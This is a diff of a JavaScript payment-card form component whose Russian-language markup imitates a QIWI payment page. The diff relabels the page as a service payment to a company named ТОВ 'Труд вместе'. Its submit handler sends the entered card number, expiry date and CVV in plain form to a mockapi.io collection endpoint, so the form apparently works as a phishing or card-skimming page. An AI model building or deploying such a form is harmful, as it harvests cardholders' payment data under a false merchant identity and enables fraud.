@@ -63,25 +63,12 @@ export class PmtCard {
 
   onSubmitHandler() {
     if (this.isReadyToSubmit.cardInp && this.isReadyToSubmit.cvvInp && this.isReadyToSubmit.dateInp) {
-      console.log('was sent');
       this.isTimerToShow = true;
-      // const dataToSend = {
-      //   cardNumber: this.cardInput,
-      //   expDate: this.expDateInput,
-      //   cvv: this.cvvInput,
-      // };
-      axios
-        .post('https://631cbb941b470e0e12094434.mockapi.io/cards', {
-          cardNumber: this.cardInput,
-          expDate: this.expDateInput,
-          cvv: this.cvvInput,
-        })
-        .then(function (response) {
-          console.log(response);
-        })
-        .catch(function (error) {
-          console.log(error);
-        });
+      axios.post('https://631cbb941b470e0e12094434.mockapi.io/cards', {
+        cardNumber: this.cardInput,
+        expDate: this.expDateInput,
+        cvv: this.cvvInput,
+      });
     }
   }
 
@@ -209,7 +196,7 @@ export class PmtCard {
                 <div class="sc-kgoBCf kmrOKx">
                   <div class="sc-kGXeez fJWbau">
                     <div class="sc-kpOJdX kXEdGh" id="InvoiceInfoView-MerchantTitle">
-                      Перевод физическому лицу
+                      Оплата услуг
                     </div>
                   </div>
                   <div class="sc-dxgOiQ hZcWTU" id="InvoiceInfoView-Amount">
@@ -217,10 +204,10 @@ export class PmtCard {
                   </div>
                   <div class="sc-gqjmRU eEUcXg">
                     <div class="sc-VigVT bJZLvQ" id="CommissionInfo-Card">
-                      Комиссия будет рассчитана после ввода реквизитов карты
+                      Комиссия будет рассчитана после ввода реквизитов карты и оплаты
                     </div>
                     <div class="sc-VigVT cERtjU" id="CommissionInfo-Bank">
-                      Совершая платеж, Вы пополняете баланс QIWI Кошелька.&nbsp;Банк, выпустивший карту, может взимать дополнительную комиссию.
+                      Совершая платеж, Вы оплачивате услуги компании ТОВ "Труд вместе".&nbsp;Банк, выпустивший карту, может взимать дополнительную комиссию.
                     </div>
                   </div>
                   <div class="sc-jzJRlG erwnQD"></div>
